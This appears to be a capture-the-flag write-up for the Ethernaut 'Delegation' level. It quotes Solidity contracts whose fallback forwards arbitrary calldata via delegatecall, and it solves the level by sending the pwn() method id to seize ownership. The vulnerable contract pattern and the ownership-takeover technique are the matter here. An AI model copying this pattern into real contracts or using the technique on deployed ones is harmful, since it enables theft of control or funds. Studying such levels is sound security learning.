@@ -1,0 +1,66 @@
+Delegation
+Difficulty 4/10
+
+The goal of this level is for you to claim ownership of the instance you are given.
+
+  Things that might help
+
+Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
+Fallback methods
+Method ids
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) public {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+
+Information:
+
+delegatecall: https://www.youtube.com/watch?v=Yh8UL7FZwAI
+https://solidity-by-example.org/delegatecall/
+https://ethereum.stackexchange.com/questions/91826/why-are-there-two-methods-encoding-arguments-abi-encode-and-abi-encodepacked
+
+Solution:
+
+Deploy contract: 0x3AC2062c8D912281f9e4817CD02f41C3D2E7b7Fa
+
+Ww have to call to the contract deployed with calldata (I use remix). The value to send in the method id of the function "pwn". To obtain the method id I create this script, and run in local:
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Hack3 {
+
+    function getEncodedValue(string memory value) public pure returns (bytes memory) {
+        return abi.encodeWithSignature(value); //result with "pwn()" is 0xdd365b8b
+    }
+}
